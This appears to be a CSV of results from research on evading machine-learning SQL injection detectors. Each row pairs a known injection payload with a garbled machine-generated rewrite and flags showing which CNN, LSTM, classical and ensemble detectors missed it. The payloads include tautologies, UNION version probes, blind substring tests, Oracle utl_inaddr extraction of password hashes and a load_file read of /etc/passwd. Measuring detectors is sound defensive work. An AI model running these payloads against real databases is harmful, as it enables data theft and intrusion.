,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
0,""" or pg_sleep  (  __TIME__  )  --","SELECT * FROM SQL_injector, __TIME__ ) FROM query: 'yes'",1,0,1,1,1,1,1
1,create user name identified by pass123 temporary tablespace temp default tablespace users;,SELECT MIN(evade_sq_injection) FROM SQL SELECT MIN(evade_sq_injection) FROM SQL SELECT MIN(evade_sq_injection) FROM query_customer WHERE NOT SELECT generated FROM tablespace temp default tablespace users,1,0,1,1,1,1,1
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SELECT SELECT MIN(ROWNUM) FROM sys.all_tables) AND NOT SELECT SELECT SELECT SELECT MIN(ROWNUM) FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT FROM SQL_inaddr.get_host_address WHERE NOT'sql_inaddr.get_host_address.get_host_address.get_host_address_address_address.'sql injection'),1,1,1,1,1,1,1
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'","SELECT MIN(sql injection) FROM SQL injection detection WHERE id = '1' OR @ @1 = 1 union select 1,version ( ) -- 1'",1,1,1,0,0,0,0
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1## = 1 OR union select 1,version ( ) -- 1",1,1,0,0,0,0,0
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 +$+ or 1 = 1,1,1,0,0,0,0,0
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;","SELECT NOT SQL_injection, COUNT(*) FROM SQL_Injection WHERE NOT SQL_Injection = ""valid""",1,1,1,0,1,1,0
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",SELECT MIN(sql injection) FROM SQL injection detection WHERE id = 1 OR ORDER BY id = 1,1,1,1,0,0,0,0
9," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'","SELECT * FROM * FROM users WHERE NOT id = '1' OR. union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
10,? or 1  =  1 --,SELECT * FROM query: SELECT ORDER BY COUNT(*) DESC LIMIT 1,1,1,1,1,1,1,1
11, )   or   (  'a'  =  'a,SELECT DISTINCT'sql injection' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL,1,0,1,1,0,1,0
12,admin' or 1  =  1#,SELECT MIN(1 = 1#) FROM SQL injection detection,1,1,0,0,1,0,0
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1,1,0,0,0,0
14,or 1  =  1 --,SELECT * FROM SQL AS t1 FROM query: or 1 = 1,1,1,1,0,1,1,0
15," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM) AS _local_address WHERE NOT SELECT SELECT SELECT FROM SQL_inaddr.get_host_address),0,0,1,1,1,1,1
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' %!@ union select 1,version ( ) -- 1'",1,1,0,0,0,0,0
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR '&((*) = 1 ORDER BY id = 1,0,1,0,0,0,0,0
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 ORDER BY id = 1,1,1,1,0,1,1,0
19,distinct,SELECT DISTINCT SQL FROM query: SELECT DISTINCT SQL FROM query: invalid,1,0,1,1,1,1,1
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',SELECT * FROM * FROM users WHERE id = '1' ORDER BY 1 = 1,1,1,1,0,0,0,0
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",SELECT MIN(short) FROM SQL injection detection WHERE NOT SELECT MIN(sysobjects) FROM SQL SELECT MIN(sysobjects) FROM query: 1 AND query: 1 and ascii (lower (short) FROM query: 1 AND query: 1 and 1 ) > 116,1,1,0,0,1,0,0
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR. OR 1 = 1,1,1,1,0,0,0,0
23,"admin"" or ""1""  =  ""1""--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR % = 1 OR 1 = 1,1,1,0,0,0,0,0
25,insert,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR 1 = 1,1,1,1,0,1,1,0
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR i = 1 OR 1 = 1,1,1,1,0,0,0,0
28," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i","SELECT SELECT MIN(ROWNUM) FROM SYS.USER$ - SELECT SELECT MIN(ROWNUM) FROM SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.USER$ - SELECT SELECT MIN(ROWNUM) FROM (SELECT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.USER$) FROM (SELECT SELECT, SUM(ROWNUM AS _0,'sql injection')",0,1,0,1,1,1,0
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1,1,0,0,0,0
30,"or 1  =  1 or """"  =  ",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: or 1 = 1 ORDER BY generated,1,1,0,0,1,0,0
31,/**/or/**/1/**/  =  /**/1,"SELECT * FROM SQL AS /**/or/**/1/**/ = /**/1 WHERE NOT SQL_injection = ""valid""",1,1,1,0,0,0,0
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY id = 1,1,1,1,0,1,1,0
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",SELECT MIN(version) - 1 FROM SQL injection detection,1,1,1,1,1,1,1
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL injection detection WHERE id = '1' union select +.,@@VERSION -- 1'",1,1,1,0,0,0,0
35,or 1  =  1/*,SELECT * FROM query: or 1 = 1/* WHERE NOT SQL_injection = 'valid',1,1,0,0,1,0,0
36,%27 or 1  =  1,SELECT * FROM query: %27 ORDER BY query: %27 = 1,1,1,0,0,1,0,0
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 @&@ union select 1,version ( ) -- 1",1,1,1,0,0,0,0
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","SELECT NOT char ( 47,101,99,99,... FROM query: 1; SELECT SUM(claim_file) FROM SQL query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; (SELECT SUM(CASE WHEN STRFTIME('%y', 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, SELECT SUM(last_file) FROM SELECT SUM(load_file) FROM char WHERE NOT char = ""sql injection"" AND SUM(CASE WHEN STRFTIME('%y', '%y','start of year') = '1'",1,1,0,0,1,0,0
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'","SELECT * FROM SQL injection detection WHERE id = '1' OR $ 1 = 1 union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
